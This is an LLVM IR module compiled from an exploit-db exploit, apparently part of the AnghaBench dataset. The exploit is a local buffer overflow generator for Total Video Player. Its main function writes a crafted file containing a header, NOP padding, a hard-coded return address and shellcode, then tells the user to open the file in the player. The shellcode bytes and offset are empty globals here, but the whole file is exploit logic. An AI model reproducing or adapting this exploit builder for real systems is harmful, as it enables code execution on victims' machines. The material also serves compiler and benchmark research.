; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_7923.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_7923.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [59 x i8] c"*********************************************************\0A\00", align 1
@.str.1 = private unnamed_addr constant [60 x i8] c"Total Video Player local universal buffer overflow exploit\0A\00", align 1
@.str.2 = private unnamed_addr constant [44 x i8] c"Cded by SimO-s0fT(simo_at_exploiter-ma.com)\00", align 1
@.str.3 = private unnamed_addr constant [20 x i8] c"greetz : to Allah \0A\00", align 1
@.str.4 = private unnamed_addr constant [75 x i8] c"this exploit is for my best friends : Sup3r-crystal & mr.5rab & Hack back\0A\00", align 1
@.str.5 = private unnamed_addr constant [61 x i8] c"***********************************************************\0A\00", align 1
@.str.6 = private unnamed_addr constant [3 x i8] c"%d\00", align 1
@.str.7 = private unnamed_addr constant [3 x i8] c"wb\00", align 1
@.str.8 = private unnamed_addr constant [24 x i8] c"connot opening .....!!\0A\00", align 1
@OFFSET = common dso_local global i32 0, align 4
@scode1 = common dso_local global i32* null, align 8
@twacha = common dso_local global i8* null, align 8
@.str.9 = private unnamed_addr constant [37 x i8] c"File created ....!\0Aopen it with tvp\0A\00", align 1
@scode2 = common dso_local global i32* null, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 2089145704, i32* %9, align 4
  store i32 0, i32* %10, align 4
  %11 = call i32 @printf(i8* getelementptr inbounds ([59 x i8], [59 x i8]* @.str, i64 0, i64 0))
  %12 = call i32 @printf(i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.1, i64 0, i64 0))
  %13 = call i32 @printf(i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.2, i64 0, i64 0))
  %14 = call i32 @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.3, i64 0, i64 0))
  %15 = call i32 @printf(i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.4, i64 0, i64 0))
  %16 = call i32 @printf(i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.5, i64 0, i64 0))
  %17 = call i32 @scanf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.6, i64 0, i64 0), i32* %10)
  %18 = load i8**, i8*** %5, align 8
  %19 = getelementptr inbounds i8*, i8** %18, i64 1
  %20 = load i8*, i8** %19, align 8
  %21 = call i32* @fopen(i8* %20, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.7, i64 0, i64 0))
  store i32* %21, i32** %6, align 8
  %22 = icmp eq i32* %21, null
  br i1 %22, label %23, label %26

23:                                               ; preds = %2
  %24 = call i32 @perror(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i64 0, i64 0))
  %25 = call i32 @exit(i32 0) #3
  unreachable

26:                                               ; preds = %2
  %27 = load i32, i32* %10, align 4
  switch i32 %27, label %130 [
    i32 1, label %28
    i32 2, label %80
  ]

28:                                               ; preds = %26
  %29 = load i32, i32* @OFFSET, align 4
  %30 = load i32*, i32** @scode1, align 8
  %31 = call i32 @strlen(i32* %30)
  %32 = add nsw i32 %29, %31
  %33 = sext i32 %32 to i64
  %34 = add i64 %33, 4
  %35 = trunc i64 %34 to i32
  %36 = call i64 @malloc(i32 %35)
  %37 = inttoptr i64 %36 to i8*
  store i8* %37, i8** %7, align 8
  %38 = load i8*, i8** %7, align 8
  %39 = load i32, i32* @OFFSET, align 4
  %40 = load i32*, i32** @scode1, align 8
  %41 = call i32 @strlen(i32* %40)
  %42 = add nsw i32 %39, %41
  %43 = sext i32 %42 to i64
  %44 = add i64 %43, 4
  %45 = trunc i64 %44 to i32
  %46 = call i32 @memset(i8* %38, i32 144, i32 %45)
  %47 = load i32, i32* @OFFSET, align 4
  store i32 %47, i32* %8, align 4
  %48 = load i8*, i8** %7, align 8
  %49 = load i32, i32* %8, align 4
  %50 = zext i32 %49 to i64
  %51 = getelementptr inbounds i8, i8* %48, i64 %50
  %52 = ptrtoint i8* %51 to i32
  %53 = call i32 @memcpy(i32 %52, i32* %9, i32 3)
  %54 = load i32, i32* %8, align 4
  %55 = zext i32 %54 to i64
  %56 = add i64 %55, 4
  %57 = trunc i64 %56 to i32
  store i32 %57, i32* %8, align 4
  %58 = load i8*, i8** %7, align 8
  %59 = load i32, i32* %8, align 4
  %60 = zext i32 %59 to i64
  %61 = getelementptr inbounds i8, i8* %58, i64 %60
  %62 = ptrtoint i8* %61 to i32
  %63 = load i32*, i32** @scode1, align 8
  %64 = load i32*, i32** @scode1, align 8
  %65 = call i32 @strlen(i32* %64)
  %66 = call i32 @memcpy(i32 %62, i32* %63, i32 %65)
  %67 = load i32*, i32** @scode1, align 8
  %68 = call i32 @strlen(i32* %67)
  %69 = load i32, i32* %8, align 4
  %70 = add i32 %69, %68
  store i32 %70, i32* %8, align 4
  %71 = load i8*, i8** @twacha, align 8
  %72 = load i32*, i32** %6, align 8
  %73 = call i32 @fputs(i8* %71, i32* %72)
  %74 = load i8*, i8** %7, align 8
  %75 = load i32*, i32** %6, align 8
  %76 = call i32 @fputs(i8* %74, i32* %75)
  %77 = load i32*, i32** %6, align 8
  %78 = call i32 @fclose(i32* %77)
  %79 = call i32 @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.9, i64 0, i64 0))
  br label %130

80:                                               ; preds = %26
  %81 = load i32, i32* @OFFSET, align 4
  %82 = load i32*, i32** @scode2, align 8
  %83 = call i32 @strlen(i32* %82)
  %84 = add nsw i32 %81, %83
  %85 = sext i32 %84 to i64
  %86 = add i64 %85, 4
  %87 = trunc i64 %86 to i32
  %88 = call i64 @malloc(i32 %87)
  %89 = inttoptr i64 %88 to i8*
  store i8* %89, i8** %7, align 8
  %90 = load i8*, i8** %7, align 8
  %91 = load i32, i32* @OFFSET, align 4
  %92 = load i32*, i32** @scode2, align 8
  %93 = call i32 @strlen(i32* %92)
  %94 = add nsw i32 %91, %93
  %95 = sext i32 %94 to i64
  %96 = add i64 %95, 4
  %97 = trunc i64 %96 to i32
  %98 = call i32 @memset(i8* %90, i32 144, i32 %97)
  %99 = load i32, i32* @OFFSET, align 4
  store i32 %99, i32* %8, align 4
  %100 = load i8*, i8** %7, align 8
  %101 = load i32, i32* %8, align 4
  %102 = zext i32 %101 to i64
  %103 = getelementptr inbounds i8, i8* %100, i64 %102
  %104 = ptrtoint i8* %103 to i32
  %105 = call i32 @memcpy(i32 %104, i32* %9, i32 3)
  %106 = load i32, i32* %8, align 4
  %107 = zext i32 %106 to i64
  %108 = add i64 %107, 4
  %109 = trunc i64 %108 to i32
  store i32 %109, i32* %8, align 4
  %110 = load i8*, i8** %7, align 8
  %111 = load i32, i32* %8, align 4
  %112 = zext i32 %111 to i64
  %113 = getelementptr inbounds i8, i8* %110, i64 %112
  %114 = ptrtoint i8* %113 to i32
  %115 = load i32*, i32** @scode2, align 8
  %116 = load i32*, i32** @scode2, align 8
  %117 = call i32 @strlen(i32* %116)
  %118 = call i32 @memcpy(i32 %114, i32* %115, i32 %117)
  %119 = load i32*, i32** @scode2, align 8
  %120 = call i32 @strlen(i32* %119)
  store i32 %120, i32* %8, align 4
  %121 = load i8*, i8** @twacha, align 8
  %122 = load i32*, i32** %6, align 8
  %123 = call i32 @fputs(i8* %121, i32* %122)
  %124 = load i8*, i8** %7, align 8
  %125 = load i32*, i32** %6, align 8
  %126 = call i32 @fputs(i8* %124, i32* %125)
  %127 = load i32*, i32** %6, align 8
  %128 = call i32 @fclose(i32* %127)
  %129 = call i32 @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.9, i64 0, i64 0))
  br label %130

130:                                              ; preds = %26, %80, %28
  %131 = load i8*, i8** %7, align 8
  %132 = call i32 @free(i8* %131)
  ret i32 0
}

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @scanf(i8*, i32*) #1

declare dso_local i32* @fopen(i8*, i8*) #1

declare dso_local i32 @perror(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @strlen(i32*) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @memcpy(i32, i32*, i32) #1

declare dso_local i32 @fputs(i8*, i32*) #1

declare dso_local i32 @fclose(i32*) #1

declare dso_local i32 @free(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
